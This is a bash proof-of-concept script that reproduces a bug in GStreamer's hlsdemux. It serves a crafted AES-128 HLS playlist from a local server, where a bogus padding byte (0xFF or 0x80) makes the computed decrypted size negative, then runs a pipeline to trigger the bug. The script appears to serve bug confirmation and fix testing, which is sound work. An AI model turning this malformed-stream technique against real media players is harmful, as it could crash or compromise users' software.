#!/usr/bin/env bash
# Real end-to-end reproduction: a real local HTTP server (a genuine second participant, standing
# in for a malicious/compromised HLS origin server) serves a crafted AES-128 media playlist, key,
# and a single-block encrypted "segment" whose decrypted final byte is 0xFF (a padding length
# larger than the whole buffer). A real `souphttpsrc ! hlsdemux ! fakesink` pipeline, run via the
# project's own public `gst-launch-1.0` tool, fetches and decrypts it through the real code path
# in gst_hls_demux_finish_fragment().
#
# Usage: BUILD_DIR=<meson builddir> SRC_DIR=<gstreamer checkout> run.sh [primary|boundary]
#   primary  (default): last decrypted byte 0xFF, size 16  -> unpadded_size = 16 - 255 = -239
#   boundary:            last decrypted byte 0x80, size 16 -> unpadded_size = 16 - 128 = -112
#                        (a second, different value in the same bug class - see CONFIRMATION.md
#                        section 7 - to confirm a fix isn't narrowly tailored to one byte value)
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MODE="${1:-primary}"

: "${BUILD_DIR:?BUILD_DIR must be set (meson build directory with hls+soup enabled)}"
: "${SRC_DIR:?SRC_DIR must be set (gstreamer checkout root, for gst-env.py)}"

case "$MODE" in
  primary)  PLAYLIST="media.m3u8" ;;
  boundary) PLAYLIST="media2.m3u8" ;;
  *) echo "unknown mode: $MODE (expected primary|boundary)" >&2; exit 2 ;;
esac

PORT_FILE="$(mktemp)"
python3 "$HERE/serve.py" 0 "$HERE/www" > "$PORT_FILE" 2>&1 &
SERVER_PID=$!
cleanup() { kill "$SERVER_PID" >/dev/null 2>&1; rm -f "$PORT_FILE"; }
trap cleanup EXIT

PORT=""
for _ in $(seq 1 50); do
  PORT="$(head -n1 "$PORT_FILE" 2>/dev/null | tr -d '[:space:]')"
  [ -n "$PORT" ] && break
  sleep 0.1
done
if [ -z "$PORT" ]; then
  echo "local HTTP server failed to start" >&2
  cat "$PORT_FILE" >&2
  exit 1
fi

# gst-env.py's generated script appends to a few vars (e.g. GST_ENCODING_TARGET_PATH) assuming
# they may already be set in the parent shell - harmless under normal `bash`, but `set -u` turns
# that into a hard failure, so relax it only for the source.
set +u
# shellcheck disable=SC1090
source <(cd "$SRC_DIR" && python3 gst-env.py --builddir="$BUILD_DIR" --only-environment)
set -u

ulimit -c 0
G_DEBUG=fatal-warnings timeout 15 gst-launch-1.0 \
    souphttpsrc location="http://127.0.0.1:${PORT}/${PLAYLIST}" ! hlsdemux ! fakesink
RC=$?
echo "EXIT_CODE=$RC"
exit "$RC"
